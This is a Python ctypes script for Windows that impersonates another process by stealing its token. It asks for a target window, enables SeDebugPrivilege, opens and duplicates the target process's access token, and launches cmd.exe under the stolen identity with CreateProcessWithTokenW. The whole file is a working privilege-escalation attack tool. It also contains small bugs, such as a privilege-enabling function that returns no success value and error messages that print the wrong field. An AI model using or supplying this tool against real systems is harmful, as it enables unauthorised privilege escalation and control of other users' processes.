import ctypes
from ctypes.wintypes import DWORD,HANDLE,BOOL,LPSTR,WORD,LPBYTE

k_handle=ctypes.WinDLL("kernel32.dll")
u_handle=ctypes.WinDLL("user32.dll")
a_handle=ctypes.WinDLL("Advapi32.dll")

PROCESS_ALL_ACCESS= (0x000F0000 | 0x00100000 | 0xFFF)

SE_PRIVILEGE_ENABLED=0X00000002
SE_PRIVILEGE_DISABLED=0X00000000

STANDARD_RIGHTS_REQUIRED = (0x000F0000)
TOKEN_ASSIGN_PRIMARY = (0x0001)
TOKEN_DUPLICATE = (0x0002)
TOKEN_IMPERSONATE = (0x0004)
TOKEN_QUERY = (0x0008)
TOKEN_QUERY_SOURCE = (0x0010)
TOKEN_ADJUST_PRIVILEGES = (0x0020)
TOKEN_ADJUST_GROUPS = (0x0040)
TOKEN_ADJUST_DEFAULT = (0x0080)
TOKEN_ADJUST_SESSIONID = (0x0100)


TOKEN_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED |
                    TOKEN_ASSIGN_PRIMARY |
                    TOKEN_DUPLICATE |
                    TOKEN_IMPERSONATE |
                    TOKEN_QUERY |
                    TOKEN_QUERY_SOURCE |
                    TOKEN_ADJUST_PRIVILEGES |
                    TOKEN_ADJUST_GROUPS |
                    TOKEN_ADJUST_DEFAULT |
                    TOKEN_ADJUST_SESSIONID)

class LUID(ctypes.Structure):
    _fields_=[
        ("LowPart",DWORD),
        ("HighPart",DWORD)
        ]

class LUID_AND_ATTRIBUTES(ctypes.Structure):
    _fields_=[
        ("Luid",LUID),
        ("Attributes",DWORD)
        ]

class PRIVILEGE_SET(ctypes.Structure):
    _fields_=[
        ("PrivilegeCount",DWORD),
        ("Control",DWORD),
        ("Privilege",LUID_AND_ATTRIBUTES)
        ]

class TOKEN_PRIVILEGES(ctypes.Structure):
    _fields_=[
        ("PrivilegeCount",DWORD),
        ("Privilege",LUID_AND_ATTRIBUTES)
        ]

class SECURITY_ATTRIBUTES(ctypes.Structure):
    _fields_=[
        ("nLength",DWORD),
        ("lpSecurityDescriptor",HANDLE),
        ("bInheritHandle",BOOL)
        ]

class PROCESS_INFO(ctypes.Structure):
    _fields_=[
        ("hProcess",HANDLE),
        ("hTread",HANDLE),
        ("dwProcessId",DWORD),
        ("dwTHreadId",DWORD)
        ]

class STARTUPINFO(ctypes.Structure):
    _fields_=[
        ("cb",DWORD),
        ("lpReserved",LPSTR),
        ("lpDesktop",LPSTR),
        ("lpTitle",LPSTR),
        ("dwX",DWORD),
        ("dwY",DWORD),
        ("dwXSize",DWORD),
        ("dwYSize",DWORD),
        ("dwXCountChar",DWORD),
        ("dwCountChar",DWORD),
        ("dwFillAttributes",DWORD),
        ("dwFlags",DWORD),
        ("wShowWindow",WORD),
        ("cbReserved",WORD),
        ("lpReserves2",LPBYTE),
        ("hStdInput",HANDLE),
        ("hStdOutput",HANDLE),
        ("hStdError",HANDLE)
    ]

def EnablePriv(priv,handle):
    lpSystemName=None
    lpName=priv
    lpLuid=LUID()
    
    response=a_handle.LookupPrivilegeValueW(lpSystemName,lpName,ctypes.byref(lpLuid))
    
    if response==0:
        print("[ERROR] Lookup for {0} failed! Error Code: {0}".format(priv,k_handle.GetLastError()))
        return 0
    else:
        print("[INFO] Lookup for {0} done successfully.".format(priv))
    
    requiredPrivilege=PRIVILEGE_SET()
    pfResult=ctypes.c_long()
    
    requiredPrivilege.PrivilegeCount=1
    requiredPrivilege.Privilege=LUID_AND_ATTRIBUTES()
    requiredPrivilege.Privilege.Luid=lpLuid
    requiredPrivilege.Privilege.Attributes=SE_PRIVILEGE_ENABLED
    
    response=a_handle.PrivilegeCheck(handle,ctypes.byref(requiredPrivilege),ctypes.byref(pfResult))
    
    if response==0:
        print("[ERROR] Privilege check not worked. Error Code: {0}".format(k_handle.GetLastError()))
        return 0
    else:
        print("[INFO], Privilege check worked")
    
    if pfResult:
        print("[INFO] Privilege {0} is already enabled.".format(priv))
    else:
        requiredPrivilege.Privilege.Attributes=SE_PRIVILEGE_ENABLED
        print("[INFO] Privilege {0} in not enabled".format(priv))
    
    DisableAllPrivileges=False
    NewState=TOKEN_PRIVILEGES()
    BufferLength=ctypes.sizeof(NewState)
    PreviousState=ctypes.c_void_p()
    ReturnLength=ctypes.c_void_p()
    
    NewState.PrivilegeCount=1
    NewState.Privilege=requiredPrivilege.Privilege
    
    response=a_handle.AdjustTokenPrivileges(
        handle,
        DisableAllPrivileges,
        ctypes.byref(NewState),
        BufferLength,
        ctypes.byref(PreviousState),
        ctypes.byref(ReturnLength))
        
    if response==0:
        print("[ERROR] AdjustTokenPrivileges {0} not enabled. Error Code: {0}".format(priv,k_handle.GetLastError()))
        return 0
    else:
        print("[INFO] AdjustTokenPrivileges {0} is enabled.".format(priv))
    
def OpenProcToken(hProcess):
    ProcessHandle=hProcess
    DesiredAccess=TOKEN_ALL_ACCESS
    TokenHandle=ctypes.c_void_p()
    
    response=a_handle.OpenProcessToken(ProcessHandle,DesiredAccess,ctypes.byref(TokenHandle))
    
    if response==0:
        print("[ERROR] Handle to prcoess token no created. Error Code: {0}".format(k_handle.GetLastError()))
        return 0
    else:
        print("[INFO] Handle to process token created successfully. Token code: {0}".format(TokenHandle))
        return TokenHandle        

def OpenProcbyPid(pid):
    dwDesiredAccess=PROCESS_ALL_ACCESS
    bInheritHandle=False
    dwProcessId=pid
    
    response=k_handle.OpenProcess(dwDesiredAccess,bInheritHandle,dwProcessId)
    
    if response==0:
        print("[ERROR] Counld not start the process. Error Code: {0}".format(k_handle.GetLastError()))
        return 0
    else:
        print("[INFO] Process started successfully")
        return response

lpClassName=None
lpWindowName=ctypes.c_char_p(input("[+]Enter the process to hook into: ").encode("utf-8"))
 
hWnd=u_handle.FindWindowA(lpClassName,lpWindowName)

if hWnd==0:
    print("[ERROR] Handle not grabbed. Error Code: {0}".format(k_handle.GetLastError()))
    exit(1)
else:
    print("[INFO] Handle grabbed successfully")
    
lpdwProcessId=ctypes.c_long()

response=u_handle.GetWindowThreadProcessId(hWnd,ctypes.byref(lpdwProcessId))

if response==0:
    print("[ERROR] Pid not grabbed. Error Code: {0}".format(k_handle.GetLastError()))
else:
    print("[INFO] Pid grabbed successfully")

TokenHandle=OpenProcToken(OpenProcbyPid(lpdwProcessId))

currentProcessHandle=OpenProcToken(OpenProcbyPid(k_handle.GetCurrentProcessId()))

print("[INFO] Enabling the privileges on current process.")
response=EnablePriv("SEDebugPrivilege",currentProcessHandle)

if response ==0:
    print("[ERROR] Could not enable privileges")
    exit(1)

dwDesiredAccess=TOKEN_ALL_ACCESS
lpTokenAttributes=SECURITY_ATTRIBUTES()
ImpersonationLevel=2
TokenType=1
hNewToken=ctypes.c_void_p()

lpTokenAttributes.bInheritHandle=False
lpTokenAttributes.lpSecurityDescriptor=ctypes.c_void_p()
lpTokenAttributes.nLength=ctypes.sizeof(lpTokenAttributes)

response=a_handle.DuplicateTokenEx(
    TokenHandle,
    dwDesiredAccess,
    ctypes.byref(lpTokenAttributes),
    ImpersonationLevel,
    TokenType,
    ctypes.byref(hNewToken)) 

if response==0:
    print("[ERROR] Token duplication failed. Error Code: {0}".format(k_handle.GetLastError()))
    exit(1)
    
hToken=hNewToken
dwLogonFlags=0x00000001
lpApplicationName="C:\Windows\System32\cmd.exe"
lpCommandLine=None
dwCreationFlags=0x00000010
lpEnvironment=None
lpCurrentDirectory=None
lpStratupinfo=STARTUPINFO()
lpProcessInfo=PROCESS_INFO()

lpStratupinfo.cb=ctypes.sizeof(lpStratupinfo)
lpStratupinfo.wShowWindow=0x1
lpStratupinfo.dwFlags=0x1

response=a_handle.CreateProcessWithTokenW(
    hToken,
    dwLogonFlags,
    lpApplicationName,
    lpCommandLine,
    dwCreationFlags,
    lpEnvironment,
    lpCurrentDirectory,
    ctypes.byref(lpStratupinfo),
    ctypes.byref(lpProcessInfo)
    )
    
if response==0:
    print("[ERROR] COunld not create process with duplicate token. Error Code: {0}".format(k_handle.GetLastError()))
    exit(1)
else:    
    print("[INFO] Created Impersonated Process")
